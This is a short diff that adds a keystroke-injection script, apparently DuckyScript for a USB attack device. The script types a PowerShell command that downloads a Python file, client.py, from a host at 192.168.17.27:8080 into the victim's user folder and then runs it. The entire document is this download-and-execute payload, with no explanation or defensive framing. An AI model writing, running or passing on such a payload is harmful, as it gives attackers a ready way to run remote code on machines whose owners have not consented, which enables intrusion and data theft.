@@ -1,0 +1,6 @@
+DELAY 1000
+STRING powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.17.27:8080/client.py', 'C:\\Users\\%USERNAME%\\client.py')"
+ENTER
+DELAY 2000
+STRING python C:\\Users\\%USERNAME%\\client.py
+ENTER
